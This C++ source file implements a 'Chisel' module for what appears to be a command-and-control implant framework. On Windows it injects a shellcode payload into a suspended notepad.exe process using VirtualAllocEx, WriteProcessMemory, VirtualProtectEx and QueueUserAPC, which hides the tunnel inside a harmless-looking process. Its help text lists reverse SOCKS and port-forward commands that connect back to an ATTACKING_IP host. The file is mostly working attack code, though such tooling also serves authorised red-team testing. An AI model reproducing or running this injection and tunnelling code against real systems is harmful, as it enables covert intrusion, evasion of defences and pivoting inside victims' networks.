#include "Chisel.hpp"

#include <cstring>

#include "Common.hpp"
#include "Tools.hpp"

using namespace std;

constexpr std::string_view moduleName = "chisel";
constexpr unsigned long long moduleHash = djb2(moduleName);

#define BUFSIZE 512

namespace
{
    constexpr int ERROR_OPEN_PROCESS = 1;
    constexpr int ERROR_CREATE_PROCESS = 2;
}

#ifdef _WIN32

__declspec(dllexport) Chisel* A_ChiselConstructor() 
{
    return new Chisel();
}

#else

__attribute__((visibility("default"))) Chisel* ChiselConstructor() 
{
    return new Chisel();
}

#endif

Chisel::Chisel()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleName), moduleHash)
#else
    : ModuleCmd("", moduleHash)
#endif
{
}

Chisel::~Chisel()
{
}

std::string Chisel::getInfo()
{
    std::string info;
#ifdef BUILD_TEAMSERVER
    info += "Chisel:\n";
    info += "Launch chisel in a thread on the remote server.\n";
    info += "No output is provided.\n";
    info += "exemple:\n";
    info += "- chisel status\n";
    info += "- chisel stop pid\n";
    info += "Reverse Socks Proxy:\n";
    info += "- chisel client ATTACKING_IP:LISTEN_PORT R:socks\n";
    info += "- On the attacking machine: chisel server -p LISTEN_PORT --reverse\n";
    info += "Remote Port Forward:\n";
    info += "- chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:REMOT_PORT\n";
    info += "- On the attacking machine: chisel server -p LISTEN_PORT --reverse\n";
#endif
    return info;
}

#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS) || defined(C2CORE_BUILD_FUNCTIONAL_TESTS)
int Chisel::initPreparedShellcode(const ModulePreparedShellcodeTask& task, C2Message& c2Message)
{
    if (task.payload.empty())
    {
        c2Message.set_returnvalue("Shellcode payload is empty.");
        return -1;
    }

    c2Message.set_instruction(std::string(moduleName));
    c2Message.set_inputfile(task.inputFile);
    c2Message.set_cmd(task.displayCommand);
    c2Message.set_data(task.payload.data(), task.payload.size());
    return 0;
}
#endif

int Chisel::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS) 
    if (splitedCmd.size() == 2)
    {
        if(splitedCmd[1]=="status")
        {
            std::string msg;
            for(int i=0; i<m_instances.size(); i++)
            {
                msg+="pid ";
                msg+=std::to_string(m_instances[i].first);
                msg+=",  ";
                msg+=m_instances[i].second;
                msg+="\n";
            }
            c2Message.set_returnvalue(msg);
            return -1;
        }
        else
        {
            c2Message.set_returnvalue(getInfo());
            return -1;
        }
    }
    else if (splitedCmd.size() == 3)
    {
        if(splitedCmd[1]=="stop")
        {
            int pid=-1;
            try 
            {
                pid = atoi(splitedCmd[2].c_str());
            }
            catch (const std::invalid_argument& ia) 
            {
                c2Message.set_returnvalue(getInfo());
                return -1;
            }

            c2Message.set_instruction(splitedCmd[0]);
            c2Message.set_pid(pid);
            c2Message.set_cmd("stop");
        }
        else
        {
            c2Message.set_returnvalue(getInfo());
            return -1;
        }
    }
    else if (splitedCmd.size() >= 2)
    {
        c2Message.set_returnvalue("Chisel start tasks are prepared by the TeamServer shellcode service.\n");
        return -1;
    }
    else
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }
#endif
    return 0;
}


int Chisel::process(C2Message &c2Message, C2Message &c2RetMessage)
{
    const std::string payload = c2Message.data();

    std::string result;
    int pid=-1;

#ifdef __linux__
#elif _WIN32

    if(c2Message.cmd()=="stop")
    {
        pid = c2Message.pid();
        HANDLE hProc=OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid);
        if(hProc == NULL)
        {
            c2RetMessage.set_errorCode(ERROR_OPEN_PROCESS);
            result = "OpenProcess failed.";
        }
        else
        {
            TerminateProcess(hProc,9);
            CloseHandle(hProc);
            result="Chisel stoped.\n";
        }

        c2RetMessage.set_instruction(c2RetMessage.instruction());
        c2RetMessage.set_pid(pid);
        c2RetMessage.set_cmd("stop");

        c2RetMessage.set_returnvalue(result);
        return 0;
    }

    STARTUPINFO si;
     PROCESS_INFORMATION pi;

     ZeroMemory(&si, sizeof(si));
     si.cb = sizeof(si);
     ZeroMemory(&pi, sizeof(pi));

    TCHAR szCmdline[] = TEXT("notepad.exe");
     if (CreateProcess(NULL, szCmdline, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
     {
         PVOID remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, payload.size(), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
         WriteProcessMemory(pi.hProcess, remoteBuffer, payload.data(), payload.size(), NULL);
         DWORD oldprotect = 0;
         VirtualProtectEx(pi.hProcess, remoteBuffer, payload.size(), PAGE_EXECUTE_READ, &oldprotect);
         PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)remoteBuffer;
         QueueUserAPC((PAPCFUNC)apcRoutine, pi.hThread, NULL);
         ResumeThread(pi.hThread);

        pid=pi.dwProcessId;
        result = "Start chisel on pid ";
        result += std::to_string(pid);
        result += "\n";
    }
    else
    {
         result += "CreateProcess failed.";
         c2RetMessage.set_errorCode(ERROR_CREATE_PROCESS);
    }

#endif

    c2RetMessage.set_instruction(c2RetMessage.instruction());
    c2RetMessage.set_pid(pid);
    c2RetMessage.set_cmd(c2Message.cmd());
    c2RetMessage.set_returnvalue(result);

    return 0;
}

int Chisel::errorCodeToMsg(const C2Message &c2RetMessage, std::string &errorMsg)
{
#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS) || defined(C2CORE_BUILD_FUNCTIONAL_TESTS)
    if (c2RetMessage.errorCode() > 0)
    {
        errorMsg = c2RetMessage.returnvalue();
    }
#endif
    return 0;
}

int Chisel::followUp(const C2Message &c2RetMessage)
{
    int pid = c2RetMessage.pid();
    if(pid!=-1)
    {    
        if(c2RetMessage.cmd()=="stop")
        {
            auto it = m_instances.begin();
            while(it != m_instances.end()) 
            {
                std::cout << (*it).first << std::endl;
                if((*it).first == pid) 
                {
                    it = m_instances.erase(it);
                } 
                else 
                {
                    it++;
                }
            }
        }
        else
        {
            std::pair<int, std::string> inst;
            inst.first = pid;
            inst.second = c2RetMessage.cmd();
            m_instances.push_back(inst);
        }
    }

    return 0;
}
